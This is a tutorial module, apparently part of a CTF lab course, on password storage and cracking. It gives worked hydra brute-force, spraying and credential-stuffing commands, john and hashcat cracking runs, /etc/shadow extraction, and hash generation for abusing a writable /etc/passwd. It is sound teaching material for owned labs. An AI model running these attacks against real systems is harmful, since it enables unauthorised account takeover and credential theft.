# 04 — Credentials and Cracking

Every machine in this path ends with you holding a credential you should not have.
Most of them *start* that way too. This module covers where credentials come from,
how password storage actually works, and how to attack it.

Full treatment: [`docs/CONCEPTS.md` §7](../docs/CONCEPTS.md#7-what-is-a-wordlist)
(wordlists), [§10](../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)
(encoding vs hashing vs encryption) and
[§14](../docs/CONCEPTS.md#14-password-cracking) (cracking).

---

## 1. The distinction that decides everything

These three are conflated constantly, and the confusion costs hours:

| | **Encoding** | **Hashing** | **Encryption** |
| --- | --- | --- | --- |
| Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
| Reversible? | **Yes — trivially, no key** | **No** (only guessable) | Yes, **with the key** |
| Key needed? | No | No | **Yes** |
| Examples | base64, hex, URL-encoding, ROT13, brainfuck | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
| Security value | **Zero** | Depends on the algorithm | Depends on the key |

**Why it matters operationally:** if what you found is *encoded*, you are one
command from the answer. If it is *hashed*, you are starting a guessing game whose
cost depends entirely on the algorithm. If it is *encrypted*, you need the key.

```bash
echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
# aarti:aarti@gmail.com
```

> **Base64 is not a secret.** It exists so binary data survives text-only transport
> — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> *finding*, not a defence. Machine 2 is built entirely on a student making this
> mistake in the other direction.

**Recognise base64 on sight:** the character set is only `A–Z a–z 0–9 + /` with
optional `=` padding, and **the length is a multiple of 4**. **Always check whether
it is nested** — decode, then test whether the result is itself base64 or hex.
Machine 8 uses **brainfuck**, an esoteric programming language, as "encryption";
`bf` and `python3 -c` both decode it, and the point is that *obscurity is not
confidentiality*.

**Identify hashes by prefix or length:**

| Shape | Algorithm | Crackable? |
| --- | --- | --- |
| 32 hex chars | MD5 | Instantly |
| 40 hex chars | SHA-1 | Instantly |
| 64 hex chars | SHA-256 | Instantly |
| `$1$…` | MD5-crypt | Fast |
| `$apr1$…` | Apache `.htpasswd` | Fast |
| `$2b$…` / `$2a$…` | bcrypt | Slow, by design |
| `$5$…` / `$6$…` | SHA-256/512-crypt | Slow |
| `$y$…` | yescrypt (modern Ubuntu) | Slow |
| **`$P$…` / `$H$…`** | **phpass — WordPress, Drupal** | ~5k/sec: 8192 MD5 rounds, deliberately slow |

Machine 7 uses **unsalted MD5** — the weakest thing on this list, and it falls in
seconds. Machine 9 uses **bcrypt**, which is why you attack the *wordlist* rather
than the algorithm.

---

## 2. Wordlists: where they come from

**`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
RockYou was breached; they had stored **32 million passwords in plaintext** — no
hashing at all. The dump became the most-used password list in security precisely
because it records what real people actually chose. It has 14,344,392 entries,
**ordered by observed frequency**, so the top of the file is disproportionately
valuable. On Kali it ships gzipped:

```bash
sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
wc -l rockyou.txt      # 14344392
```

| List | Size | Use for |
| --- | --- | --- |
| `rockyou.txt` | 14.3 M | Real human password choices |
| `dirb/common.txt` | 4,612 | First web content pass |
| `dirb/big.txt` | 204,669 | Second web pass |
| `fasttrack.txt` | 222 | The most common *service* passwords |
| **SecLists** | huge | Everything else — `sudo apt install seclists` |

### But a generic list fails against a themed box

CTF authors pick passwords that fit their theme and then scatter theme words all
over the website. A targeted list beats `rockyou` completely in that case:

```bash
cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
python3 cupp.py -i                                              # build from a name, birthday, pet, employer
crunch 6 6 -t for%%% -o dict.txt                                # generate from a known pattern
```

| `cewl` flag | Meaning |
| --- | --- |
| `-d 2` | Crawl to depth 2 |
| `-m 4` | Minimum word length 4 |
| `-e` | Include email addresses found |
| `--with-numbers` | Accept words containing digits |
| `-w file` | Write the list out |

**Machine 4 (DC: 2) is the canonical lesson.** Its passwords are drawn from the
site's own content, and the intended solution is `cewl` → `wpscan`/`hydra`. Running
`rockyou.txt` at it will not work in any reasonable time. Machine 7 rewards the same
instinct.

---

## 3. The four attacks — do not confuse them

| Attack | Tries | Cost | Notes |
| --- | --- | --- | --- |
| **Wordlist** | a curated list, many passwords → **one** account | Low | Highest hit rate per attempt |
| **Brute force** | every character combination | Astronomical | Only sane for ≤6 chars or a known pattern |
| **Password spraying** | **one** password → **many** accounts | Low | Stays *under* per-account lockout thresholds |
| **Credential stuffing** | real leaked `user:pass` pairs | Low | Exploits reuse across sites |

Spraying is the professional default against lockout-protected systems: one
attempt per account, across hundreds of accounts, so no single account trips a
threshold. `hydra -L users.txt -p 'Summer2024!'` is a spray; `hydra -l admin -P
rockyou.txt` is not.

### Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target -t 4 -f
hydra -L users.txt -P pass.txt http-post-form://target/wp-login.php:"log=^USER^&pwd=^PASS^:F=incorrect"
hydra -l user -p '' ftp://target -e nsr
```

| Flag | Meaning |
| --- | --- |
| `-l USER` / `-L file` | single **l**ogin / a *file* of them |
| `-p PASS` / `-P file` | single **p**assword / a *file* of them |
| `-C file` | colon-separated `user:pass` **pairs** (stuffing) |
| **`-e nsr`** | also try **n**ull password, **s**ame-as-username, **r**eversed username |
| `-f` | stop at the first success |
| `-t N` | threads — higher is faster, noisier, and destabilises old VMs |
| `ssh://`, `ftp://`, `http-post-form://` | the **service module** — picking the wrong one is the most common Hydra mistake |

> **Always include `-e nsr`.** The three cheapest guesses in existence are empty,
> the username, and the reversed username — and they succeed astonishingly often,
> usually in under a second, before the wordlist is even consulted. Machine 1's
> intended path involves a password that *is* the username.

> ⚠️ Pointing Hydra at all 14 million lines of `rockyou` over SSH would take days
> and generate millions of failed logins in `auth.log`. Fine on a VM you own; on a
> real system it is an obvious, logged event. Professionals throttle with `-t 4`,
> use a short targeted list, and spray rather than hammer.

For web forms, `http-post-form` needs three things: the POST path, the body with
`^USER^`/`^PASS^` placeholders, and a **failure string** (`F=…`) or success string
(`S=…`) that distinguishes a bad login from a good one. Find it by logging in
incorrectly in a browser and reading the response.

---

## 4. Cracking offline

Once you have a hash, you never touch the server again:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt                                  # results without re-cracking
john --format=phpass --wordlist=rockyou.txt hash.txt  # force the format
unshadow /etc/passwd /etc/shadow > combined.txt       # prepare Linux hashes
hashcat -m 400 -a 0 hash.txt rockyou.txt              # -m = mode, -a 0 = wordlist
zip2john secret.zip > zip.hash && john --wordlist=rockyou.txt zip.hash
ssh2john id_rsa > key.hash
```

| hashcat `-m` | Algorithm |
| --- | --- |
| `0` | MD5 |
| `100` | SHA-1 |
| `400` | phpass (WordPress/Drupal) |
| `500` | MD5-crypt (`$1$`) |
| `1800` | SHA-512-crypt (`$6$`) |
| `3200` | bcrypt (`$2b$`) |
| `13600` | ZIP |
| `22921` | SSH RSA key |

**Reading John's output:**

```text
Loaded 1 password hash (phpass, MD5 [phpass 2.4.x/2.4.y 4x32])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (steven)
1g 0:00:00:14 DONE  3842p/s 71.43g/s
```

`Loaded 1 password hash (phpass, …)` means it auto-detected the format correctly —
if it says `No password hashes loaded`, pass `--format=` explicitly
(`john --list=formats` lists them). `1g 0:00:00:14 DONE` means one guess succeeded
in 14 seconds; `3842p/s` is the candidate rate. **That low rate is the algorithm's
defence working** — for MD5 it would be billions per second.

> ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> one of the most common reasons a crack "finds nothing".

**If the wordlist fails, add rules before giving up** — automatic mangling that
capitalises, appends digits and applies leetspeak:

```bash
john --wordlist=rockyou.txt --rules hash.txt
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

`best64.rule` applies 64 transformations per word. A list that fails outright very
often succeeds with rules, at 64× the cost.

---

## 5. Credential reuse: the highest-value habit in this module

**Every credential you find, try everywhere.** Against every service on the
machine, and against every username you have enumerated. This is not a tip — it is
the single most productive reflex on beginner boxes, and it is the reason
`hydra -C pairs.txt` exists.

Machines 1, 4, 7, 11 and 12 all hinge on reuse:

- a **database** password reused as the **system** password (Machines 10, 11)
- a **CMS** password reused for **SSH** (Machines 7, 11, 12)
- a **flag or encoded secret** reused as a password (Machine 2)
- one user's password reused by **another user** (Machine 4)

Build the habit mechanically. Keep a `creds.txt` in your notes and append every
`user:pass` you find, then:

```bash
# try every pair against every interesting service
hydra -C creds.txt ssh://target -t 4 -f
hydra -C creds.txt ftp://target
```

**Where credentials hide**, in rough order of how often they pay off:

| Location | Why |
| --- | --- |
| `wp-config.php`, `configuration.php`, `.env`, `web.config`, `settings.py` | A CMS needs DB credentials on *every* request, so they are necessarily plaintext |
| `~/.bash_history`, `~/.mysql_history` | People type passwords on command lines constantly |
| `*.bak`, `*.old`, `*.swp`, `*~` in the web root | Editors leave them; servers serve them as text |
| `/var/backups/`, `/opt/`, `/srv/` | Admin dumps and notes |
| Emails, tickets, README files on an SMB share | Machine 11's entire foothold |
| HTML comments and `robots.txt` | Machines 2, 6, 7, 13 |
| Image metadata and steganography | Machine 7 and others |
| `/etc/passwd` when field 2 holds a real hash instead of `x` | Legacy misconfiguration |

---

## 6. Exercises

1. **Prove one-wayness.** Hash a password with `md5sum`, then try to recover it by
   any method other than guessing. Write down why you cannot.
2. **Encode vs hash.** Take the string `admin:password`, base64-encode it, then
   MD5-hash it. Reverse both. Record which one you reversed without a key.
3. **Build a targeted wordlist.** Point `cewl` at any public site you own or a local
   app, with `-m 4 --with-numbers -e`. How many words? How many look like plausible
   passwords?
4. **Crack a real format.** Create a test user on a Kali VM, `unshadow` the files,
   and crack it with `john`. Then force the wrong `--format=` and observe the error.
5. **Measure algorithm cost.** Crack the same password stored as MD5 and as bcrypt
   with hashcat and compare `H/s`. Explain the difference in one sentence.
6. **Spray, don't hammer.** Against a local DVWA, run a 5-account × 1-password
   spray and then a 1-account × 5-password attack. Note which one a lockout policy
   would stop.

---

## 7. Check yourself

1. You find `cGFzc3dvcmQ=`. Is that a password you need to crack? Justify your answer.
2. Why is the *length* of a base64 string a useful tell, and what length property holds?
3. Which hash prefix indicates WordPress, and roughly how many guesses per second
   can a GPU make against it?
4. What is the difference between password spraying and brute force, and why does
   spraying defeat per-account lockouts?
5. What does `hydra -e nsr` add, and why should it be on every run?
6. Why must a hash be single-quoted on a shell command line?
7. Your wordlist attack fails. Name two things you try before concluding the
   password is strong.
8. Name four places credentials commonly hide on a compromised web server.

---

## 8. Annotated command reference — every input, every output

`TARGET` = the victim VM, `ATTACKER` = your Kali on the lab interface.

---

### 8.1 Recognising what you have found

```bash
printf '%s' 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
hash-identifier
```

```text
aarti:aarti@gmail.com
```

```text
   #########################################################################
   #     __  __                     __           ___    #                  #
   #    /\ \/\ \                   /\ \         /\_ \   #                  #
   #########################################################################
                                    v1.2

   Possible Hashs:
   [+] MD5
   [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

   Least Possible Hashs:
   [+] RAdmin v2.x
   [+] NTLM
   [+] MD4
```

`hash-identifier` is interactive: paste the hash at its `HASH:` prompt and it ranks
candidates by likelihood. Read the **`Possible Hashs`** block as "these are all
consistent with the shape" — a bare 32-hex string *is* ambiguous (MD5, NTLM, MD4 all
produce 32 hex characters), so the tool cannot decide for you. Use it to narrow, then
confirm from **context**: where did you find it? A `wp_users.user_pass` column is phpass;
a `/etc/shadow` field is crypt; a file named `password.raw-md5` is telling you the answer.

**The shape table you should memorise:**

| Shape | Algorithm | Prefix tells you |
| --- | --- | --- |
| 32 hex | MD5 / NTLM / MD4 | ambiguous — need context |
| 40 hex | SHA-1 | |
| 64 hex | SHA-256 | |
| `$1$salt$…` | MD5-crypt | Linux, legacy |
| `$apr1$…` | Apache `.htpasswd` | |
| `$2a$`/`$2b$`/`$2y$` | bcrypt | the `$` fields are cost, salt, hash |
| `$5$…` / `$6$…` | SHA-256/512-crypt | modern Linux default was `$6$` |
| `$y$…` | yescrypt | current Debian/Ubuntu default |
| `$P$…` / `$H$…` | **phpass** | WordPress, Drupal — portable hash, 8192 MD5 rounds |
| `$S$…` | Drupal phpass variant | Machine 3 |
| base64-looking | **not a hash** | decode it; there is nothing to crack |

---

### 8.2 `cewl` — building a wordlist out of the target itself

```bash
cewl -d 2 -m 5 --with-numbers -e -w dc2.txt http://dc-2/
wc -l dc2.txt
sort -u dc2.txt | wc -l
```

```text
CeWL 6.1 (Maximising Word Usage) Robin Wood (robin@digi.ninja)
Email addresses found: 2
Passwords found in HTML: 0
Writing to dc2.txt
```
```text
1214 dc2.txt
  887 dc2.txt
```

| Token | Meaning |
| --- | --- |
| `-d 2` | crawl **depth** 2 — follow links two hops from the start page |
| `-m 5` | **minimum** word length 5. Short words produce enormous lists full of noise |
| `--with-numbers` | accept words containing digits (`Summer2019`, `flag3`) |
| `-e` | also extract **email addresses** into a separate list |
| `-c` | count how often each word appears, and output `word,count` — frequency is a signal of what the site is *about* |
| `-a` | include HTML **meta tags** (`author`, `keywords`) |
| `-v` | verbose: show every URL crawled, so you can see what it could not reach |
| `-w dc2.txt` | write the list here |
| `--ua 'Mozilla/5.0'` | set a User-Agent, for apps that block scrapers |
| `-n` | do **not** output the wordlist (use with `-e` when you only want emails) |

**Reading it.** `CeWL 6.1 (Maximising Word Usage)` — the tool's own joke about its
purpose. `Email addresses found: 2` — with `-e`, those go to `dc2.txt.email` and are
often **usernames**, not just contacts. `Passwords found in HTML: 0` — cewl also looks
for password-shaped patterns in the page.

`wc -l` says **1214 lines** but `sort -u` says **887 unique** — so ~27% were duplicates.
**Always de-duplicate before attacking.** Duplicates do not add coverage; they add time
and, worse, they make a hit look rarer than it is. Machine 7 makes this dramatic:
`fsocity.dic` is 858,160 lines and only **11,451** of them are unique — a 75× reduction,
which is the difference between a usable attack and a three-day one.

```bash
sort -u -o dc2.txt dc2.txt
```

`-o` writes the sorted-unique result back over the input in one step. (`sort -u f > f`
**truncates the file before sort reads it** — the shell opens the output first — leaving
you with nothing. Use `-o`, or a temporary file.)

---

### 8.3 `john` — cracking, and reading every line it prints

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 robot.hash
john --show robot.hash
john --list=formats | tr ',' '\n' | grep -i phpass
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (robot)
1g 0:00:00:00 DONE (2024-05-11 13:02) 3842p/s 71.43g/s 1049Kp/s
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

**The input**

| Token | Meaning |
| --- | --- |
| `john` | John the Ripper. It auto-detects the hash format from the string's shape |
| `--wordlist=FILE` | a **dictionary** attack: try each line |
| `--format=Raw-MD5` | force the format when auto-detection is ambiguous (a bare 32-hex string could be many things) |
| `--show` | display already-cracked results from `~/.john/john.pot`. **Never re-crack; check the pot first** |
| `--rules` | apply mangling rules to every word (capitalise, append digits, leetspeak) |
| `--incremental` | true brute force — every combination. Effectively endless |
| `--fork=8` | run 8 processes (multi-core scaling where OpenMP is unavailable) |
| `--list=formats` | list every format John understands |
| `--session=name` | name the session so you can `--restore=name` it after an interruption |
| `--pot=FILE` | use a specific pot file |

**Reading the output, line by line**

1. `Using default input encoding: UTF-8` — how John reads your wordlist. If the file is
   Latin-1 with accented characters you get `Warning: detected hash type "…" but the
   string is also recognized as "…"` or mangled guesses; fix with
   `--input-encoding=ISO-8859-1`.
2. **`Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])`** — the crucial line.
   `Loaded 1` means John understood the input. **`No password hashes loaded` means it did
   not** — usually a wrong `--format=`, or a shell that ate the `$` in `$1$…` before John
   saw it. `AVX2 8x3` describes the SIMD implementation: it can test 8 candidates per
   instruction across 3 lanes, i.e. 24 at once.
3. `Warning: no OpenMP support for this hash type, consider --fork=8` — John cannot
   thread this format internally, so it tells you how to parallelise externally.
4. `Press 'q' or Ctrl-C to abort, almost any other key for status` — literally: any other
   key prints a live progress line without stopping the run. Use it to see the rate.
5. **`abcdefghijklmnopqrstuvwxyz (robot)`** — the cracked password, then the account
   label in parentheses. The label comes from the `user:hash` form in your input file.
6. `1g 0:00:00:00 DONE` — **1 guess** succeeded, elapsed time. `3842p/s` = candidate
   **passwords per second**; `71.43g/s` = guesses per second (they differ when rules
   expand each word into several candidates). `1049Kp/s` is the same rate, larger unit.
   **These rates are the whole story of algorithm choice:** MD5 runs at *billions* per
   second on a GPU; phpass at ~5,000; bcrypt at tens of thousands; argon2 lower still. A
   "slow" hash is not broken — it is buying time.
7. `Session completed.` — clean finish. An interrupted session can be resumed with
   `--restore`.

**Rules — try these before concluding a password is strong:**

```bash
john --wordlist=rockyou.txt --rules robot.hash
```

Rules transform each word: `Password` → `password`, `PASSWORD`, `password1`,
`password!`, `p@ssword`, … `best64.rule` applies 64 transformations per word, so the
search space grows 64× and so does the runtime. That trade-off is exactly why you start
with the plain list and escalate.

---

### 8.4 `unshadow` and Linux hashes

```bash
sudo cp /etc/passwd /etc/shadow /tmp/     # from the target, once you can read them
unshadow passwd shadow > combined.txt
john --wordlist=rockyou.txt combined.txt
```

```text
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pink84           (steven)
marlinspike      (marlinspike)
2g 0:00:00:41 DONE  1842p/s 4.83g/s
Session completed.
```

**Why `unshadow` exists.** Modern Unix splits the account database in two: `/etc/passwd`
is world-readable and holds `name:x:uid:gid:comment:home:shell`, where the `x` is a
*placeholder* meaning "the hash is elsewhere"; `/etc/shadow` is root-only and holds
`name:hash:lastchange:min:max:warn:inactive:expire`. A cracker needs the **username next
to the hash** — for rules like "password = username", and to label its results.
`unshadow` merges them back into the old single-file format:

```text
steven:$6$Xk2j…$9f8e…:17379:0:99999:7:::
```

**Reading the output**

1. `Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ …)` —
   **two salts** means John cannot batch them into one pass; each candidate must be
   hashed once per salt. That halves throughput, and it is why per-user salts matter
   defensively: they defeat precomputed tables *and* parallel batching.
2. **`Cost 1 (iteration count) is 5000 for all loaded hashes`** — the work factor. Each
   guess runs 5,000 SHA-512 rounds. That number is stored *in the hash*, so an attacker
   knows it and cannot be slowed further by hiding it — its only job is to make each
   guess expensive.
3. `1842p/s` — about 1,800 guesses per second for sha512crypt, versus millions for raw
   MD5. Same GPU, different algorithm.
4. Two cracked results, and note the second: **`marlinspike (marlinspike)`** — the
   password *is* the username. John found it because you used `unshadow` and the username
   was present; a bare hash file with no label would have needed `--rules` or an explicit
   guess. That is a concrete demonstration of why usernames and hashes travel together.

---

### 8.5 `hashcat` — modes, and the status screen

```bash
hashcat -m 400 -a 0 phpass.hash /usr/share/wordlists/rockyou.txt
hashcat -m 400 -a 0 phpass.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat --show -m 400 phpass.hash
hashcat -b -m 400
```

```text
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [NVIDIA]
* Device #1: NVIDIA GeForce RTX 3070, 7982/8118 MB, 46MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 71 MB

Dictionary cache built from /usr/share/wordlists/rockyou.txt: Using default input encoding: UTF-8
$P$Bz2wN3mJqH8vK9xL4nR5pQ7yT1uW0e:letmein

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass, WordPress (wp), vBulletin, bbPress)
Hash.Target......: $P$Bz2wN3mJqH8vK9xL4nR5pQ7yT1uW0e
Time.Started.....: Sat May 11 13:14:02 (14 secs)
Time.Estimated...: Sat May 11 13:14:16 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5382 H/s (11.20ms) @ Accel:64 Loops:64 Thr:1024 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 75366/14344391 (0.53%)
Rejected.........: 0/75366 (0.00%)
Restore.Point....: 74752/14344391 (0.52%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-64
Candidate.Engine.: Device Generator
Candidates.#1....: 12345678 -> qwertyuiop
Hardware.Mon.#1..: Temp: 63c Fan: 45% Util: 99% Core:1755MHz Mem:7000MHz Bus:8

Started: Sat May 11 13:14:00
Stopped: Sat May 11 13:14:18
```

**The input**

| Token | Meaning |
| --- | --- |
| `-m 400` | the **hash mode** — hashcat's numeric ID for the algorithm. `0` MD5, `100` SHA-1, `400` phpass, `500` MD5-crypt, `1800` sha512crypt, `3200` bcrypt, `13600` ZIP, `22921` SSH RSA. **The wrong `-m` is the most common hashcat error** and produces `No hashes found` |
| `-a 0` | the **attack mode**: `0` straight wordlist, `1` combinator (two lists), `3` mask/brute force, `6` wordlist + mask append, `9` association |
| `-r FILE` | apply a **rules** file (mangling). `best64.rule`, `rockyou-30000.rule`, `d3ad0ne.rule` |
| `--show` | print already-cracked results |
| `-b` | **benchmark** every mode — the fastest way to learn your own hardware's rates |
| `-o out.txt` | write cracked results to a file |
| `--force` | ignore warnings (e.g. running as root, or an unsupported device) |
| `-w 3` | workload profile 1–4; higher is faster and hotter |
| `-O` | use the optimised kernel — faster, but caps password length |
| `--potfile-disable` | do not read or write the pot |

**Reading the status block — the lines that matter**

1. `Device #1: NVIDIA GeForce RTX 3070, 7982/8118 MB` — your cracking hardware. hashcat
   runs on the **GPU**, not the CPU; that is the entire reason it is orders of magnitude
   faster than John on fast hashes.
2. **`Status...........: Cracked`** — other values are `Running`, `Exhausted` (the list
   finished with no hit), `Aborted`, `Bypassed`. **`Exhausted` is a definitive negative
   result**: the password is not in that list.
3. `Hash.Mode........: 400 (phpass, WordPress (wp), vBulletin, bbPress)` — confirms your
   `-m` was right, and names the products that use it.
4. `Time.Started … (14 secs)` and `Time.Estimated … (0 secs)` — elapsed and remaining.
   Estimated time is how you decide whether to walk away or to change strategy.
5. **`Speed.#1.........: 5382 H/s`** — hashes per second. **This is the algorithm's
   defence, made visible.** On the same GPU, MD5 (`-m 0`) would report tens of
   *billions* H/s. phpass does 8,192 MD5 rounds internally, bcrypt does its own
   expensive key setup — hence five thousand per second instead of five billion. `(11.20ms)`
   is the kernel round-trip.
6. `Progress.........: 75366/14344391 (0.53%)` — how far through the list you are. Note
   the denominator: **the whole of rockyou**. At 5,382 H/s, 14.3 million candidates is
   ~45 minutes for a single hash — and far worse for bcrypt. This is the arithmetic that
   makes a `cewl` list attractive.
7. `Rejected.........: 0/75366 (0.00%)` — candidates discarded before hashing (too long,
   invalid encoding). A high rejection rate means your list and your `-m` disagree.
8. `Candidates.#1....: 12345678 -> qwertyuiop` — the range of words currently being
   tried. Since rockyou is **ordered by real-world frequency**, this line tells you that
   hashcat has only covered the most common passwords so far — and that a hit now means
   the user chose a top-75,000 password.
9. `Hardware.Mon.#1..: Temp: 63c Fan: 45% Util: 99%` — the GPU is saturated (99%) and
   cool enough. `Temp: 90c+` triggers the abort watchdog set at the top of the log.

**Benchmark to calibrate your expectations:**

```text
$ hashcat -b -m 400
Speed.#1.........:     5411 H/s (11.14ms)
$ hashcat -b -m 0
Speed.#1.........: 22458.1 MH/s (2.85ms)
```

`MH/s` = millions per second. **MD5: 22 billion per second. phpass: 5 thousand.** That is
a factor of roughly four million, and it is the single most persuasive argument for slow
password hashing you will ever see on your own screen.

---

### 8.6 Archive and key extraction — `zip2john`, `ssh2john`, `pdf2john`

```bash
zip2john secret.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
ssh2john id_rsa > key.hash
john --format=SSH --wordlist=rockyou.txt key.hash
```

```text
ver 2.0 secret.zip/wp-config.php is not encrypted, or stored with non-handled compression type
ver 2.0 secret.zip/backup.sql PKZIP Encr: TS_chk, cmpr=8, mod=2049, type=PkZip, strong-protect, AES-256, bruteforce, 3 files, 1 salt

Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyou         (secret.zip/backup.sql)
1g 0:00:00:06 DONE  2841p/s 6.42g/s
```

The `*2john` family are **extractors**: they parse a container format, find the
encrypted blob, and rewrite it in the `user:$hash$…` format John expects. Nothing is
cracked by them.

**Reading the extractor's preamble carefully — it is diagnostic:**
`secret.zip/wp-config.php is not encrypted` means that member is stored in the clear, so
John ignores it and you could simply `unzip` it. `PKZIP Encr: TS_chk, cmpr=8, mod=2049,
type=PkZip, strong-protect, AES-256, bruteforce, 3 files, 1 salt` is John's own analysis:
compression method 8 (deflate), **AES-256**, and `1 salt` — the archive uses one salt for
all members, so cracking one member cracks them all. `Loaded 1 password hash (PKZIP
[32/64])` confirms only one member needed cracking. The result line names the member it
succeeded on: `(secret.zip/backup.sql)`.

For SSH keys, `ssh2john` output looks like `id_rsa:$sshng$1$16$…$…` and the format is
`SSH`. Note that `ssh2john` **fails silently on unencrypted keys** — if your `id_rsa` has
no passphrase there is nothing to crack; just `ssh -i id_rsa` and see whether it works.

---

### 8.7 `hydra` — the four attacks, one tool

```bash
hydra -e nsr -l admin ftp://TARGET                                  # null/same/reversed
hydra -C creds.txt ssh://TARGET -s 7744 -t 4 -f                     # stuffing known pairs
hydra -L users.txt -p 'Summer2024!' smb://TARGET                    # SPRAY: one password, many users
hydra -l admin -P cewl.txt http-post-form://TARGET/wp-login.php:"log=^USER^&pwd=^PASS^:F=incorrect"
```

```text
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

[WARNING] Restorefile (ignored "-" and "-s") from a previous session found, to prevent overwriting, ...
[DATA] max 4 tasks per 1 server, overall 4 tasks, 3 login tries (l:3/p:1), ~1 try per task
[DATA] attacking smb://192.168.56.104:445/
[25][smb] host: 192.168.56.104   login: helios   password: qwerty
[STATUS] attack finished for host 192.168.56.104 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

**The four attacks, and how each looks on the command line**

| Attack | Flags | What it does |
| --- | --- | --- |
| **Wordlist** | `-l USER -P LIST` | many passwords → **one** account |
| **Brute force** | `-l USER -x 6:8:aA1` | generate every combination (`min:max:charset`: `a` lower, `A` upper, `1` digits) |
| **Spraying** | `-L USERS -p PASS` | **one** password → many accounts. Stays under per-account lockout thresholds |
| **Stuffing** | `-C user:pass.txt` | real leaked pairs, colon-separated |

**Why spraying evades lockouts.** A lockout policy counts *failed attempts per account*.
Spraying makes exactly **one** attempt per account across hundreds of accounts, so no
counter ever reaches its threshold — while a single common password (`Summer2024!`,
`Welcome1`) still typically hits 1–5% of a user base. That asymmetry is why spraying is
the professional default and why per-account lockout alone is not a sufficient control.

**Reading hydra's plan line:**
`[DATA] max 4 tasks per 1 server, overall 4 tasks, 3 login tries (l:3/p:1), ~1 try per
task` — `(l:3/p:1)` means **3 logins × 1 password = 3 attempts** total, spread over 4
threads, so roughly one attempt each. This line is your pre-flight check: if it says
`(l:1/p:14344391)` you are about to spend a day, and you should reconsider the list.

**`-e nsr` deserves its own note.** `n` = try a **null** (empty) password, `s` = try the
**same** string as the username, `r` = try the **reversed** username. Three extra
attempts that cost microseconds, and between them they cover a shocking share of real
misconfigurations — service accounts with no password, and admins who set the password to
the username. Machine 1's bonus route is precisely `s`: `marlinspike:marlinspike`.

`[WARNING] Restorefile … from a previous session found` means hydra wants to resume an
earlier interrupted run. Pass `-I` to ignore it and start clean.

**Throttling is a correctness issue, not just etiquette.** `-t 4` on SSH avoids the
server's `MaxStartups` limit; exceeding it makes sshd drop *new* connections, which
hydra reports as failures — so a valid password can appear invalid. Slower is more
accurate.

---

### 8.8 Generating a valid hash on purpose

```bash
openssl passwd -1 -salt ignite superpassword
openssl passwd -6 -salt ignite superpassword
python3 -c "import crypt;print(crypt.crypt('superpassword', crypt.mksalt(crypt.METHOD_SHA512)))"
mkpasswd -m yescrypt superpassword
```

```text
$1$ignite$XpO6y1nK1vB0yG0yQ3m0o0
$6$ignite$9f8e7d6c5b4a39281706f5e4d3c2b1a0…
```

You generate hashes for two legitimate reasons: to **understand the format** (and so
recognise it when you find it), and to **exploit a writable `/etc/passwd`** on machines
like 1 and 9.

| Token | Meaning |
| --- | --- |
| `openssl passwd -1` | MD5-crypt → `$1$salt$hash` |
| `-5` / `-6` | SHA-256-crypt / SHA-512-crypt → `$5$…` / `$6$…` |
| `-salt ignite` | fix the salt, so the output is reproducible. Omit it and OpenSSL picks a random one |
| `-stdin` | read the password from stdin, keeping it out of the shell history and `ps` output |

**The output format is `$id$salt$hash`.** The `$1$` is not decoration — it is the
algorithm identifier the verifier reads to decide *how* to check. That is why you can mix
hashes of different algorithms in one `/etc/shadow`: each line declares its own method.
And it is why replacing the `x` in `/etc/passwd` with a real hash works at all — the
authentication code sees a `$1$…` string, recognises it, and verifies against it without
ever consulting `/etc/shadow`.

**Two operational cautions.** Never type a hash on a command line unquoted: `$1$`, `$P$`
